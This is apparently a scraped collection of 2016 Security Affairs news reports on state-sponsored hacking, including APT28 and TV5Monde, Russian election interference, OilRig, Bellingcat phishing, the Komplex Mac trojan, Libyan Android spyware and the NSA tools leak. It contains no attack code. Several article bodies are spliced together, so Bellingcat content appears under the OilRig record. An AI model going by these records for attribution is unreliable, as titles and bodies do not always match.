situation.\n\nPalo Alto Networks has opted to stop sending out email invitations due to the ongoing spear phishing campaign and is inviting users in Indonesia to ignore any message receive these days regarding the event.\n\nThe image was obtained from a screenshot of an older invitation that was properly edited. The researchers managed to revert the images to before they were cropped to extract information on the system used by the attackers.\n\n\u201cThe information in the screenshot and an analysis of the document\u2019s timestamp suggested that the user was located in China.\u201d continues the report.\n\n\u201cThe threat actor is running Windows localized for Chinese users, which suggests the actor\u2019s primary language is Chinese. The \u2018CH\u2019 icon in the Windows tray shows that the built-in Windows input method editor (IME) is currently set to Chinese,\u201d researchers explained. \u201cAlso, the screenshot shows a popular application in China called Sogou Pinyin, which is an IME that allows a user to type Chinese characters using Pinyin.

Its systems straddle the nation, including one link into the Department of Defence at Russell Offices in Canberra.\u201d\n\nThe systems at the Bureau of Meteorology elaborate a huge quantity of information and weather data that are provided to various industries, including the military one.\n\nThe consequence of a cyber attack on such kind of systems could represent a menace to the homeland security.\n\nNow new information was disclosed by the government\u2019s Australian Cyber Security Centre that Wednesday published a report on the incident. The experts at Australian Cyber Security Centre attributed \u201cthe primary compromise to a foreign intelligence service,\u201d they did not provide any information of the culprit.\n\n\u201cWe don\u2019t narrow it down to specific countries, and we do that deliberately,\u201d said the minister for cybersecurity, Dan Tehan. \u201cBut what we have indicated is that cyber espionage is alive and well,\u201d he told ABC News 24. \u201cWe have to make sure that we\u2019re taking all the steps necessary to keep us safe, because the threat is there. The threat is real. Cybersecurity is something that we, as a nation, have to take very seriously.\u201d\n\n\n\nThe report confirms the presence of a malware in the system of the Australian Bureau of Meteorology. The national cyber security agency, Australian Signals Directorate (ASD), detected a Remote Access Tool (RAT) malware \u201cpopular with state-sponsored cyber adversaries,\u201d and confirmed that the same malicious code was used to compromise other Australian government networks in the past.\n\n\u201cASD identified evidence of the adversary searching for and copying an unknown quantity of documents from the Bureau\u2019s network. This information is likely to have been stolen by the adversary.\u201d reads the report.\n\nAnother interesting aspect of the report is the opinion of the experts of the terrorist cyber threat, they explained that cyber capabilities of terrorists remain rudimentary.\n\n\u201cApart from demonstrating a savvy understanding of social media and exploiting the internet for propaganda purposes, terrorist cyber capabilities generally remain rudimentary and show few signs of improving significantly in the near future,\u201d states the report.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Australian Bureau of Meteorology, hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/australia", "topic_name": "Australia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/australian-bureau-of-meteorology", "topic_name": "Australian Bureau of Meteorology"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}]}, {"news_name": "The France TV5Monde was almost destroyed by the Russian APT28 group", "news_link": "https://securityaffairs.co/wordpress/52133/hacking/tv5monde-cyber-attack.html", "title": "The France TV5Monde was almost destroyed by the Russian APT28 group\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 11, 2016", "body": "On April 2015, the TV5Monde was hit by a severe cyber attack that compromised broadcasting of transmissions across its medium.

Mr. Bigot told the BBC that the  cyber-attack came close to destroying the network of the French TV, however, further investigation suggests the involvement of different threat actors, Russian hackers.\n\n\u201cIt\u2019s the worst thing that can happen to you in television,\u201d Mr Bigot told BBC\n\n\u201cWe were a couple of hours from having the whole station gone for good.\u201d\n\n\u201cWe were saved from total destruction by the fact we had launched the channel that day and the technicians were there,\u201d \n\n\u201cOne of them was able to locate the very machine where the attack was taking place and he was able to cut out this machine from the internet and it stopped the attack.\u201d\n\n\u201cWe owe a lot to the engineer who unplugged that particular machine. He is a hero here,\u201d \n\nThe hackers compromised the network of the French TV at least 10 weeks before (on 23 January 2015) launching the final attack with a custom malware software that was designed to target encoder systems used to transmit programmes.\n\nThe hackers carried out reconnaissance of TV5Monde network to figure out the way it broadcast its transmissions, then they used the malware to destroy the internet-connected hardware that controlled the TV station\u2019s operations.\n\n\u201cThe attack was far more sophisticated and targeted than reported at the time. The perpetrators had first penetrated the network on 23 January.\u201d reported the BBC.\n\nThe investigators have discovered multiple entry points used by the attackers, such as supplier networks and remote controlled cameras used in studios.\n\nThe involvement of a Russian threat actor, the APT 28 group, was also suggested by the security firm FireEye.\n\nAccording to security experts at FireEye, the Russian ATP28 (also known as Pawn Storm, Tsar Team, Fancy Bear and Sednit) may have used the name of ISIS as a diversionary strategy, the experts noticed a number of similarities in the TTPs used by the Russian group and the one who breached the network at TV5Monde.\n\n\u201cThere are a number of data points here in common,\u201d said Jen Weedon, manager of threat intelligence at FireEye. \u201cThe \u2018Cyber Caliphate website,\u2019 where they posted the data on the TV5Monde hack was hosted on an IP block which is the same IP block as other known APT28 infrastructure, and used the same server and registrar that APT28 used in the past.\u201d\n\nWeedon confirmed that at the time of the TV5Monde attack, other journalists were targeted by the APT28 group and the attacks were coordinated by the same hacking infrastructure used by the team.\n\nExperts at FireEye published a detailed report on ATP28 in October 2014, speculating that the group is composed by state-sponsored hackers that are managing a long-running cyber espionage campaign on US defense contractors, European security organizations and Eastern European government entities.\n\nMr. Bigot confirmed that the French cyber-agency told him that hackers had used the ISIS brand to cover their tracks.\n\n\n\nThe TV5Monde director was later told evidence had been found that the attack was conducted by the Russian APT 28 group.\n\nMr. Bigot explained that he has absolutely no idea the chosen of TV5Monde as the target.\n\n\u201cThere are two things that the investigation won\u2019t probably be able to achieve,\u201d he added. \u201cThe first one is why us \u2013 why TV5Monde?\u201d \u201cAnd the second one is: Who gave the order and the money to that Russian group of hackers to actually do it?\u201d\n\nAccording to the BBC, that cited intelligence analysts in the UK and US, and France, the cyber attack against the French TV was a highly-targeted attack conducted by Russian hackers most likely in the attempt hackers most likely in the attempt \u201cto test forms of cyber-weaponry as part of an increasingly aggressive posture\u201d.\n\nRegardless of whoever is the culprit, there is one certainty, the cyber attack cost the TV station \u20ac5m ($5.6m) and left it with an increased reoccurring bill of \u20ac3m ($3.4m) due to the necessity to implement and adopt further security countermeasures.\n\n Pierluigi Paganini\n\n(Security Affairs \u2013 APT28, Cyber Caliphate)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anssi", "topic_name": "ANSSI"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-caliphate", "topic_name": "Cyber Caliphate"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-terrorism", "topic_name": "cyber terrorism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/isis", "topic_name": "ISIS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/tv5monde", "topic_name": "TV5Monde"}]}, {"news_name": "US accuses Russia of attempting to disrupt the US Presidential election", "news_link": "https://securityaffairs.co/wordpress/52038/cyber-warfare-2/presidential-election-russia.html", "title": "US accuses Russia of attempting to disrupt the US Presidential election\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 8, 2016", "body": "US is officially accusing Russia trying to interfere the 2016 US presidential election, announcing it will adopt all necessary countermeasures to defeat the threat.\n\nThe Office of the Director of National Intelligence and the Department of Homeland Security have issued a joint security statement to accuse the Russian government of a series of intrusions into the networks of US organizations and state election boards involved in the Presidential Election.\n\n\u201cThe U.S. Intelligence Community (USIC) is confident that the Russian Government directed the recent compromises of e-mails from US persons and institutions, including from US political organizations. The recent disclosures of alleged hacked e-mails on sites like DCLeaks.com and WikiLeaks and by the Guccifer 2.0 online persona are consistent with the methods and motivations of Russian-directed efforts. These thefts and disclosures are intended to interfere with the US election process\u201d reads the statement.\n\n\u201cWe will take action to protect our interests, including in cyberspace, and we will do so at a time and place of our choosing,\u201d a senior administration official told AFP.\n\n\u201cThe public should not assume that they will necessarily know what actions have been taken or what actions we will take.\u201d\n\nThe US intelligence is publicly accusing the Russian government of conducting a wave of cyber attacks on American political organizations in order to gather intelligence and destroy the election.\n\nThe reference is of course to data leaks of the mysterious hacker Guccifer 2.0 that were \u201cintended to interfere with the US election process.\u201d\n\n\u201cWe believe, based on the scope and sensitivity of these efforts, that only Russia\u2019s senior-most officials could have authorized these activities.\u201d\n\nGuccifer 2.0 is the entity behind the attack against the Democratic National Committee (DNC). According to the security company CrowdStrike, the attack wasn\u2019t the result of the action of a lone wolf, instead, two sophisticated Russian espionage groups, COZY BEAR and FANCY BEAR were involved in the cyber espionage operation.\n\n\n\nOf course, Russian authorities have always denied any interference with the Presidential Election.\n\nThe US Government is demanding a strong response to these interferences.\n\n\u201cRussia must face serious consequences,\u201d said Republican Senator Ben Sasse.\n\n\u201cMoscow orchestrated these hacks because Putin believes Soviet-style aggression is worth it.\u201d \u201cThe United States must upend Putin\u2019s calculus with a strong diplomatic, political, cyber and economic response.\u201d\n\n\u201cit\u2019s critical to convince the Russian government to cease these activities. If it does not, we must develop a strong response.\u201d said the Democrat Dianne Feinstein, vice chair of the Senate Intelligence Committee.\n\nWhen approaching such kind of situations, Governments have to solve a series of difficult problems, such as the attribution and the elaboration of proportional response as a deterrence.\n\nThe ODNI and DHS are optimists on the resilience to cyber attacks of the Presidential Election machine. Officials from the US government believe that there is little chance Russian hackers could directly affect the election by hacking voting systems.\n\n\u201cThe USIC and the Department of Homeland Security (DHS) assess that it would be extremely difficult for someone, including a nation-state actor, to alter actual ballot counts or election results by cyber attack or intrusion. This assessment is based on the decentralized nature of our election system in this country and the number of protections state and local election officials have in place. States ensure that voting machines are not connected to the Internet, and there are numerous checks and balances as well as extensive oversight at multiple levels built into our election process.\u201d continues the joint statement.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Presidential election, Russia)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dhs", "topic_name": "DHS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dnc", "topic_name": "DNC"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/odni", "topic_name": "ODNI"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/presidential-election", "topic_name": "presidential election"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}]}, {"news_name": "OilRig campaign, Iran-Linked Hackers Target US Government & Energy Grid", "news_link": "https://securityaffairs.co/wordpress/52027/hacking/oilrig-campaign-iran-hackers.html", "title": "OilRig campaign, Iran-Linked Hackers Target US Government & Energy Grid\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 8, 2016", "body": "Iranian hackers which previously targeted organizations in Saudi Arabia are now targeting organizations in other countries, including the US, as part of a campaign identified as OilRig campaign.\n\nIn addition to expanding its reach, the group has been enhancing its malware tools.\n\na Trojan nicknamed \u201cHerHer,\u201d the executable version is able to log keystrokes. \n\n\u201cThe Zip archive is encrypted with an unknown password, but we know it contains two files named joboffer.chm and thumb.db.

According to the intelligence firm ThreatConnect, reporters from the Bellingcat agency have been targeted by spear phishing messages and suffered account takeover attempts for over a year.\n\nThe Bellingcat agency is known for its uncomfortable investigations on strong powers of Governments and organizations worldwide.\n\nYesterday the Reuters reported the news that the Malaysian flight MH17 was downed by Russian-made missile launched by pro-Russian rebels.\n\n\u201cMalaysia Airlines flight MH17 was shot down by a missile fired from a launcher brought into Ukraine from Russia and located in a village held by pro-Russian rebels, international prosecutors said on Wednesday.\u201d states the post published by the Reuters. \u201cThe conclusions were based on thousands of wiretaps, photographs, witness statements and forensic tests during more than two years of inquiries into an incident which led to a sharp rise in tensions between Russia and the West.\u201d\n\nThreatConnect who investigated the attacks speculates that threat actors have strong ties to the Russian Government, they have targeted a group of citizen journalists for publishing articles critical of Government of Moscow.\n\nData shared by the Bellingcat\u2019s founder Eliot Higgins indicates the involvement of at least two Russian nation-state groups.\n\nExperts from ThreatConnect claim the involvement of the dreaded Fancy Bear APT group who in the headlines for the attacks against the systems and people involved in the US Presidential election.\n\n\u201cFollowing our post on DCLeaks as a Russian influence operation, Bellingcat founder Eliot Higgins reached out to us. Bellingcat, a group of citizen investigative journalists, has published articles critical of Russia and has been a key contributor to the international investigation of the shootdown of Malaysian Airlines Flight 17 (MH17) over Ukraine in 2014.\u201d states the report published by ThreatConnect.\n\n\u201cHiggins shared data with ThreatConnect that indicates Bellingcat has come under sustained targeting by Russian threat actors, which allowed us to identify a 2015 spearphishing campaign that is consistent with FANCY BEAR\u2019s tactics, techniques, and procedures.\u201d\n\nAccording to the experts, the Bellingcat\u2019s agency became a target of the Russian Fancy Bear APT after its reporters investigated the shooting down of the Malaysian Airlines Flight 17 (MH17) occurred in 2014.\n\nThe second group behind the attacks is the CyberBerkut, a collective of Ukrainian hackers that are pro-Russia.\n\nThe state-sponsored hackers targeted three Bellingcat researchers with a spear phishing campaign between February 2015 and July 2016 for intelligence purposes.\n\n\n\nThe attackers used messages themed as Gmail security notices in the attempt to trick victims into clicking on the embedded links, but according to ThreatConnect the attacks failed.\n\n\u201cThese spearphishing attempts consist of a variety of spoofed Gmail security notices alerting the target that suspicious activity was detected on their account. The target is prompted to click a URL resembling a legitimate Gmail security link to review the details of this suspicious activity.\u201d continues the post.\n\n\n\nThe report also analyzes activities conducted by the CyberBerkut that defaced the Bellingcat\u2019s website earlier this year and compromised the email account of the government opposition blogger, Ruslan Leviev.\n\nThreatConnect speculates that Leviev\u2019s email account hosted by the Russian service provider Yandex was compromised with the support of an employee of the company or by the Russian intelligence. In that case the attackers exploited a zero-day in the Yandex service.\n\n\u201cLeviev published a compelling piece of citizen journalism on May 22, 2015 exploring the fate of Russian Spetsnaz soldiers believed to have been killed in combat operations within Ukraine earlier that month. According to Bellingcat founder Higgins, Leviev\u2019s contributor account was compromised and used to post the CyberBerkut message. In an email interview, Leviev makes the following statement regarding the events that led to the compromise of his credentials and the defacement.\u201d continues the analysis.\n\n\u201cIn my case, my old email account, which was located on Yandex servers, was hacked. The email account had a long, difficult password, not a word, from various letters, numbers, and special symbols. Plus there was a telephone number bound to the account for second factor authentication.\n\nExactly how it was hacked \u2014 I don\u2019t know.\n\nAt the time I was writing it is still unclear the relationship between the Fancy Bear and CyberBerkut.\n\nThis isn\u2019t the first time that Russian hackers operated to gather sensitive information on the Flight MH17 Crash, in October 2015, according to Trend Micro, the Pawn Storm APT group (aka Fancy Bear) has targeted the Dutch Safety Board to gather information regarding the status of the investigation.\n\nThe Dutch Safety Board (known as Onderzoeksraad) became a target of the cyber-espionage group before and after the safety board published their detailed report on the MH17 incident on October 13, 2015. We believe that a coordinated attack from several sides was launched to get unauthorized access to sensitive material of the investigation conducted by Dutch, Malaysian, Australian, Belgian, and Ukrainian authorities.\u201d reported TrendMicro.\n\nEnjoy the analysis.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 MH17, Fancy Bear)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/bellingcat-agency", "topic_name": "Bellingcat agency"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mh17", "topic_name": "MH17"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hacking", "topic_name": "state-sponsored hacking"}]}, {"news_name": "Fancy Bear Hackers use a new Mac\u00a0Trojan against aerospace\u00a0industry", "news_link": "https://securityaffairs.co/wordpress/51704/hacking/fancy-bear-mac-trojan.html", "title": "Fancy Bear Hackers use a new Mac\u00a0Trojan against aerospace\u00a0industry\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 27, 2016", "body": "In the last weeks, we have discussed a lot about a string of attacks that targeted the US  Democratic National Committee (DNC), security experts collected evidence of the involvement of Russian nation-state actors.\n\nIn particular, security experts at threat intelligence firm ThreatConnect have conducted an analysis on the IP addresses listed in the flash alert issued in August by the FBI that warned about two cyber attacks against the election systems in two U.S. states.\n\nThe experts from ThreatConnect discovered some connections to a Russian threat actor alleged linked to the Government of Moscow. One of the domains hosting the phishing content was registered with an email address associated with a domain known to be used by the infamous APT28 group (aka Fancy Bear, Pawn Storm, Sednit, Sofacy).\n\nNow the Fancy Bear is again in the headlines, according to the malware researchers at Palo Alto, the dreaded group is the behind a trojan targeting Mac OS X machines.\n\nAccording to Palo Alto researcher Ryan Olson, Fancy Bear has used the Komplex trojan to target organizations in the aerospace sector that were using the MacKeeper antivirus software.\n\n\u201cThe Sofacy group, also known as APT28, Pawn Storm, Fancy Bear, and Sednit, continues to add to the variety of tools they use in attacks; in this case, targeting individuals in the aerospace industry running the OS X operating system. During our analysis, we determined that Komplex was used in a previous attack campaign targeting individuals running OS X that exploited a vulnerability in the MacKeeper antivirus application to deliver Komplex as a payload.\u201d reads the analysis published by PaloAlto. \u201cKomplex shares a significant amount of functionality and traits with another tool used by Sofacy \u2013 the Carberp variant that Sofacy had used in previous attack campaigns on systems running Windows. In addition to shared code and functionality, we also discovered Komplex command and control (C2) domains that overlapped with previously identified phishing campaign infrastructures associated with the Sofacy group.\u201d\n\nThe experts observed the Komplex malware in a previous attack campaign targeting individuals running OS X that exploited a vulnerability in the MacKeeper antivirus application.\n\n\u201cThe Sofacy group created the Komplex trojan to use in attack campaigns targeting the OS X operating system \u2013 a move that showcases their continued evolution toward multi-platform attacks,\u201d Olsen says. \u201cThe tool is capable of downloading additional files to the system, executing and deleting files, as well as directly interacting with the system shell. While detailed targeting information is not currently available, we believe Komplex has been used in attacks on individuals related to the aerospace industry, as well as attacks leveraging an exploit in MacKeeper to deliver the Trojan\u201d\n\nThe Komplex malware has numerous similarities with the Carberp trojan, it was improved to gain access on PC and OS X systems and use the same command-and-control server.\n\nThe researchers noticed that Komplex\u2019s C2 domain appleupdate[.]org was not used in the past by the group, while both the apple-iclouds[.]net and itunes-helper[.]net domains have direct ties to the activity of Fancy Bear.\n\nA close look at the malicious payload used by the ATP revealed that it begins the infection process by conducting an anti-debugging check to see if it is being debuggedby detection software. This function was borrowed by Fancy Bear by an official Apple guide created in 2004 titled \u201cDetecting the Debugger\u201d.\n\n\u201cThis is not the first time the Sofacy group\u2019s malware authors have obtained techniques from publicly available sources, as demonstrated in the use of the Office Test Persistence Method that they obtained from a blog posted in 2014.\u201d continues the analysis.\n\nThe malware implements classic RAT features, it gathers information on the victim\u2019s machine including running processes, user identities, and of course it is able to remotely control it.\n\nThe malicious code is delivered within a PDF decoy on Russian space projects that executes the malware.\n\n\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Fancy Bear, Cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cozy-bear", "topic_name": "COZY BEAR"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fancy-bear", "topic_name": "FANCY BEAR"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/komplex-trojan", "topic_name": "Komplex Trojan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mac", "topic_name": "Mac"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russian-hackers", "topic_name": "Russian hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sofacy-group", "topic_name": "Sofacy Group"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsor-hackers", "topic_name": "state-sponsor hackers"}]}, {"news_name": "The Libyan Scorpions group is behind a cyber espionage campaign in Lybia", "news_link": "https://securityaffairs.co/wordpress/51685/intelligence/libyan-scorpions-espionage.html", "title": "The Libyan Scorpions group is behind a cyber espionage campaign in Lybia\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 26, 2016", "body": "Thinking of Libya we have in mind a non-stable political country where various forces fight for the control of strategic territories and oil productions. but only a few experts know about cyber malicious activities in the area.\n\nEvidently, something is changing, for the first time experts at the Cyberkov Security Incident Response team (CSIRT) collected evidence of a cyber espionage campaign operating  in different areas in Libya especially in Tripoli and Benghazi.\nOn 6 August 2016, the Cyberkov Security Incident Response team (CSIRT) spotted numerous samples of Android malware targeting entities in Libya.\nThe experts noticed that the Android malware spreading very fast through the popular Telegram messaging application and targeting high-profile Libyan influential and political figures.\nAccording to the CSIRT, the malware was first spotted after it has compromised a highly Libyan influential Telegram account via web Telegram using IP address from Spain.\nOnce the attackers compromised the mobile device of the above account they used is to target all his contacts. The experts at the Cyberkov Security Incident Response team  linked the cyber espionage campaign to a group named Libyan Scorpions.\n\n\u201cLibyan Scorpions is believed to be a political motivated group targeting a high-level influential and political figures in multiple cities within Libya. Libyan Scorpions first compromised a personal Telegram account for a Libyan influential person with unknown vector. The victim received a push notification from his Telegram app that someone from Spain is logged into his account\u201d reads the report published by the CSIRT titled \u201cHunting Libyan Scorpions\u201d \n\n\n\n\u201cThe victim mistakenly deleted Telegram application from his phone thinking that this is going to stop the attacker(s). Second day, the attacker used the victim phone number to spear phish his contacts in Telegram by pretending that the real person is sending a voice message while the file is actually a malicious APK (Android Package) file.\u201d\n\nThreat actors abused it to spread an Android malware bound with legitimate Android application pretending it is an important voice message (misspelled it by \u201cVoiceMassege.apk\u201d) which indicates a non-english (maybe an Arabic) attacker.\n\nThe experts have found the legitimate application in the official App store, this means that the Libyan Scorpions group took an instance of the APK and trojanized it.\n\n\u201cThis APK file targets only Android-based smartphones. Once the new victim click on the APK file, the application installs itself in the device without any problem and is fully functional. The icon of the application appears in the Apps menu named (URL Shortener).\u201d continues the report.\n\nWith this technique, the threat actors spread the malware that used the same technique to infect via telegram other victims of the network of contacts.\n\nFurther investigations revealed that the malware has been active at least since September 2015.\n\nThe so-called Libyan Scorpions is a politically motivated group intent in gathering intelligence and spying on influentials and political figures within Libya. The group used different malware in his campaigns, the malicious code were designed to target Android and Windows machines.\n\nThe researchers made a reverse engineering of the malicious code and discovered a configuration files containing information of the Command and Control (C2) infrastructure. The sample of malware analyzed in the report presents many similarities with popular spyware like the AlienSpy RAT.\n\n\u201cResolving the hostname gives: 41.208.110.46 which is a static Libyan IP address owned by Libya Telecom and Technology Backbone.\u201d reads the analysis. \u201cCyberkov discovered that the malware has not been uploaded to VirusTotal before and the first sample of this malware has been uploaded by us. However, 8 out of 54 AntiVirus engines detect it which is a very low detection rate (15%). Most and major American top Gartner Antivirus companies did not detect it!!\u201d\n\nLibyan Scorpions doesn\u2019t have highly technical skills anyway it was able to use a set of methods to hide and operate their malware, the cyber espionage operation leverage on good social engineering and phishing tactics.\n\n\u201cLibyan Scorpions threat actors used a set of methods to hide and operate their malwares. They appear not to have highly technical skills but a good social engineering and phishing tricks. The threat actors are not particularly sophisticated, but it is well-understood that such attacks don\u2019t need to be sophisticated in order to be effective. \u201d reads the report published by the  Cyberkov Security Incident Response team. \u201cUsing malwares as weapon in an active warzone such as Libya, make the victims easy targets for assassination or kidnapping by tracking their physical locations and monitoring them day and night. \u201c\n\nI suggest you read the report that also includes Indicators of Compromise (IoCs)\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Libyan Scorpions, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/libyan-scorpions", "topic_name": "Libyan Scorpions"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/lybia", "topic_name": "Lybia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/spyware", "topic_name": "spyware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/telegram", "topic_name": "Telegram"}]}, {"news_name": "A nation-state actor is testing methods for a massive takedown of the Internet", "news_link": "https://securityaffairs.co/wordpress/51669/hacking/internet-takedown.html", "title": "A nation-state actor is testing methods for a massive takedown of the Internet\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 26, 2016", "body": "What happens if someone shuts down the Internet? Is it possible?\n\nOur society heavily depends on technology and the Internet is the privileged vector of the information today. Blocking the Internet could paralyze countless services in almost any industry, from finance to transportation.\n\nEarly September the popular cyber security expert Bruce Schneier published an interesting post titled \u201cSomeone Is Learning How to Take Down the Internet\u201d that reveals an escalation of cyber attacks against service providers and companies responsible for the basic infrastructure of the Internet.\n\nWe are referring to coordinated attacks that experts consider a sort of tests to evaluate the resilience of most critical nodes of the global Internet. The attacks experienced by the companies request a significant effort and huge resources, a circumstance that suggests the involvement of a persistent attacker like a government, and China is the first suspect.\n\n\u201cRecently, some of the major companies that provide the basic infrastructure that makes the Internet work have seen an increase in DDoS attacks against them. Moreover, they have seen a certain profile of attacks. These attacks are significantly larger than the ones they\u2019re used to seeing. They last longer. They\u2019re more sophisticated. And they look like probing.\u201d wrote Schneier.\n\n\u201cI am unable to give details, because these companies spoke with me under a condition of anonymity. But this all is consistent with what Verisign is reporting. Verisign is the registrar for many popular top-level Internet domains, like .com and .net. If it goes down, there\u2019s a global blackout of all websites and e-mail addresses in the most common top-level domains. Every quarter, Verisign publishes a DDoS trends report. While its publication doesn\u2019t have the level of detail I heard from the companies I spoke with, the trends are the same: \u201cin Q2 2016, attacks continued to become more frequent, persistent, and complex.\u201d\n\nIt is clear that attackers aim to cause a global blackout of the most common top-level domains paralyzing a large portion of the Internet.\n\nSchneier, who has spoken with companies that faced the attacks, pointed out powerful DDoS attacks that attacks that stand out of the ordinary for their methodically escalating nature.\n\nThe attacks start with a certain power that increases as time goes by forcing the victims to deploy all its countermeasures to mitigate the threat.\n\nThe report mentioned by Schneier, titled \u201cVERISIGN-OBSERVED DDoS ATTACK TRENDS: Q2 2016\u201d confirms that companies are experiencing a wave of DDoS attacks even more sophisticated.\n\n\n\n\u201cDDoS Attacks Become More Sophisticated and Persistent DDoS attacks are a reality for today\u2019s web-reliant organizations. In Q2 2016, DDoS attacks continued to become more frequent, persistent and complex.\u201d states the report.\n\nSchneier also reported other types of attacks against the Internet infrastructure, such as numerous attempts to tamper with Internet addresses and routing.\n\n\u201cOne company told me about a variety of probing attacks in addition to the DDoS attacks: testing the ability to manipulate Internet addresses and routes, seeing how long it takes the defenders to respond, and so on. Someone is extensively testing the core defensive capabilities of the companies that provide critical Internet services.\u201d continues Schneier.\n\nWho is behind the attacks?\n\nSchneier believes that the attacks are launched by someone with cyber capabilities of a government, and he seems to exclude the efforts of hacktivists or cyber criminals, and I agree.\n\n\u201cIt doesn\u2019t seem like something an activist, criminal, or researcher would do. Profiling core infrastructure is common practice in espionage and intelligence gathering. It\u2019s not normal for companies to do that. Furthermore, the size and scale of these probes \u2014 and especially their persistence \u2014 points to state actors.\u201d explains Schneier.\n\nThe attribution of the attacks is very difficult by data suggests that China is behind them, let me add also that Russia has similar cyber abilities and is able to hide its operations online. Both countries are largely investing in building infrastructures that would be resilient to such kind of mass attacks.\n\n\u201cWe don\u2019t know where the attacks come from. The data I see suggests China, an assessment shared by the people I spoke with. On the other hand, it\u2019s possible to disguise the country of origin for these sorts of attacks.\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Internet, Hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/information-warfare", "topic_name": "Information Warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet", "topic_name": "Internet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nation-state-actors", "topic_name": "nation-state actors"}]}, {"news_name": "The leak of NSA hacking tools was caused by a staffer mistake", "news_link": "https://securityaffairs.co/wordpress/51586/intelligence/nsa-hacking-tools.html", "title": "The leak of NSA hacking tools was caused by a staffer mistake\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 23, 2016", "body": "The hack of the NSA-linked group Equation Group and the leakage of the NSA hacking tools in its arsenal it probably one the most disconcerting events of the year.\n\nSources close to the investigation revealed that the NSA knew about the data breach for three years but it maintained the secret on the case.\n\nThe sources provided further elements on the alleged attack against the US Intelligence Agency, according to the Reuters the NSA itself wasn\u2019t directly hacked by the Shadow Brokers group and the NSA hacking tools and exploits were not stolen by the popular whistleblower Edward Snowden.\n\nAccording to the sources, it seems that an employee or a contractor mistakenly left the NSA hacking tools unattended on a remote server about three years ago during a cyber operation.

